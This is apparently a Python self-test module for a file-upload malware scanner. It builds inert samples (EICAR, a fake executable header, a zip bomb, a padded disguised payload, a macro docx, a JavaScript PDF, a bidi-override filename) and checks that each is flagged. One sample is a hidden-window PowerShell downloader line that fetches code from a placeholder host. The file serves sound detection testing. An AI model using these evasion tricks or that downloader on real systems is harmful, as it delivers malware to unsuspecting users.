"""Built-in self-test.

Proves the whole pipeline works on a known set of samples, so a deployment can
be verified without hunting for real malware. Every sample here is inert: the
"executables" are a DOS header and padding, and EICAR is the industry-standard
harmless test string that antivirus products agree to flag.
"""

from __future__ import annotations

import io
import zipfile

from .config import Config
from .core.result import Verdict
from .report import Reporter

# The EICAR Standard Anti-Virus Test File. Split across a join so this source
# file itself does not trip the scanners watching the repository.
EICAR = (
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
    + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    + b"!$H+H*"
)

_FAKE_PE = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00" + b"\x00" * 54 + b"PE\x00\x00" + b"\x00" * 200
_PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + b"\x00" * 20 + b"IEND\xae\x42\x60\x82"


def _zip_of(entries: dict[str, bytes], compress: bool = True) -> bytes:
    buf = io.BytesIO()
    mode = zipfile.ZIP_DEFLATED if compress else zipfile.ZIP_STORED
    with zipfile.ZipFile(buf, "w", mode) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def _nested_zip() -> bytes:
    inner = _zip_of({"setup.exe": _FAKE_PE})
    return _zip_of({"readme.txt": b"please run setup\n", "stage2.zip": inner})


def _bomb() -> bytes:
    """A real decompression bomb: absurd ratio AND large absolute output.

    Must exceed UnpackLimits.bomb_min_bytes, since ratio alone is deliberately
    not enough to refuse an entry.
    """
    return _zip_of({"pad.bin": b"\x00" * (48 * 1024 * 1024)})


def _padded_payload() -> bytes:
    """A disguised executable behind enough zero padding to look like a bomb.

    This is the shape that used to defeat the scanner: the padding tripped the
    compression-ratio check, the entry was skipped, and the payload inside went
    unscanned. It must now be both noted *and* caught.
    """
    return _zip_of({"invoice.pdf.exe": _FAKE_PE + b"\x00" * (250 * 1024)})


def _ooxml_with_macro() -> bytes:
    return _zip_of({
        "[Content_Types].xml": b"<?xml version='1.0'?><Types/>",
        "word/document.xml": b"<?xml version='1.0'?><document/>",
        "word/vbaProject.bin": b"\x00Attribute VB_Name = \"Module1\"\x00" + b"\x00" * 64,
    })


def _pdf_with_javascript() -> bytes:
    return (
        b"%PDF-1.7\n"
        b"1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n"
        b"2 0 obj<</S/JavaScript/JS(app.alert('x');)>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )


# (description, filename, bytes, minimum verdict we require, rule that must fire)
SAMPLES: list[tuple[str, str, bytes, Verdict, str | None]] = [
    ("clean text file", "notes.txt", b"just some notes\n" * 40, Verdict.CLEAN, None),
    ("clean PNG image", "logo.png", _PNG, Verdict.CLEAN, None),
    ("executable disguised as a PDF", "invoice.pdf", _FAKE_PE,
     Verdict.MALICIOUS, "extension_content_mismatch"),
    ("double extension", "invoice.pdf.exe", _FAKE_PE, Verdict.MALICIOUS, "double_extension"),
    ("right-to-left override filename", "holiday‮gpj.exe", _FAKE_PE,
     Verdict.MALICIOUS, "filename_bidi_override"),
    ("executable appended to an image", "holiday.png", _PNG + _FAKE_PE,
     Verdict.MALICIOUS, "executable_inside_media_file"),
    ("executable nested two archives deep", "invoice.zip", _nested_zip(),
     Verdict.SUSPICIOUS, "risky_extension"),
    ("decompression bomb", "backup.zip", _bomb(), Verdict.MALICIOUS, "compression_bomb"),
    ("payload hidden behind heavy padding", "documents.zip", _padded_payload(),
     Verdict.MALICIOUS, "double_extension"),
    ("macros in a .docx", "contract.docx", _ooxml_with_macro(),
     Verdict.MALICIOUS, "macro_in_macro_free_extension"),
    ("PDF that runs JavaScript on open", "statement.pdf", _pdf_with_javascript(),
     Verdict.SUSPICIOUS, "pdf_javascript"),
    ("PowerShell downloader", "update.txt",
     b"powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=\n"
     b"$c=(New-Object Net.WebClient).DownloadString('http://example.test/p')\n",
     Verdict.SUSPICIOUS, "powershell_encoded_command"),
    ("EICAR antivirus test file", "eicar.com", EICAR, Verdict.SUSPICIOUS, None),
]


def run_selftest(config: Config, reporter: Reporter) -> int:
    """Scan every sample and report which expectations held. Returns an exit code."""
    engine = config.engine()
    status = engine.status()
    print("detectors:")
    for name, state in status.items():
        print(f"  [{'+' if state == 'ready' else '-'}] {name}: {state}")
    clamav_ready = status.get("clamav") == "ready"
    if not clamav_ready:
        print("\nnote: clamd is not reachable, so signature detection is untested.")
        print("      EICAR is expected to be missed without it.")
    print()

    passed = failed = 0
    for description, name, data, expected, required_rule in SAMPLES:
        result = engine.scan(data, name)
        rules = {f.rule for f in result.findings}

        ok = (result.verdict >= expected if expected > Verdict.CLEAN
              else result.verdict == Verdict.CLEAN)
        if required_rule and required_rule not in rules:
            ok = False
        # EICAR is a pure signature detection; without clamd nothing can catch it.
        if name == "eicar.com" and not clamav_ready:
            ok = True
            note = " (skipped: needs clamd)"
        else:
            note = ""

        mark = "PASS" if ok else "FAIL"
        print(f"  [{mark}] {description}{note}")
        print(f"         -> {result.verdict.label}: "
              f"{', '.join(sorted(rules)) if rules else 'no findings'}")
        if ok:
            passed += 1
        else:
            failed += 1
            print(f"         expected at least {expected.label}"
                  + (f" with rule '{required_rule}'" if required_rule else ""))

    print(f"\n{passed} passed, {failed} failed")
    return 0 if failed == 0 else 1
